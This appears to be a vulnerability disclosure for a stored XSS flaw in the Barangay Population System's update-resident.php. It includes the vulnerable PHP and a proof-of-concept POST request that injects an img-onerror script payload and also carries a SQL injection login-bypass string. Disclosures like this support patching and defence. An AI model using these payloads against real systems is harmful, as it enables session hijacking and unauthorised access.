# SOURCECODESTER / Barangay Population System - update-resident.php STORED XSS

## **Credits**
> Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)<br/>

## Vendor Homepage:
> https://www.sourcecodester.com/php/17109/barangay-population-monitoring-system-using-php-mysql-and-chartjs-source-code.html

## Affected Component
> /endpoint/update-resident.php

## Code
```php
if (isset($_POST['full_name'], $_POST['address'], $_POST['contact_number'])) {
        $residentID = $_POST['tbl_resident_id'];
        $fullName = $_POST['full_name'];
        $address = $_POST['address'];
        $contactNumber = $_POST['contact_number'];

        try {
            $checkStmt = $conn->prepare("SELECT full_name FROM tbl_resident WHERE full_name = :full_name");
            $checkStmt->bindParam(":full_name", $fullName, PDO::PARAM_STR);
            $checkStmt->execute();
```

## Proof of Concept
**HTTP Request Example**
``` http request
POST /endpoint/update-resident.php HTTP/1.1
Host: [REDACTED]
Content-Type: application/x-www-form-urlencoded
Content-Length: 132

tbl_resident_id=1&full_name=%3e%3cimg%20src%3dx%20onerror%3dalert('NoChizPlZ')%3e&address=Purkok+1&contact_number=%28551%29+577-2147email=nochizplz%40nochizplz.com&password=nochizplz'+or+1%3d1+limit+1%23
```

## Screenshot
![image](https://github.com/skid-nochizplz/skid-nochizplz/assets/160950031/aca77ced-34ee-42e1-976d-0534ba155d0c)
![image](https://github.com/skid-nochizplz/skid-nochizplz/assets/160950031/b48eb9bc-ef1a-4087-84e4-b0c3828dfeb4)

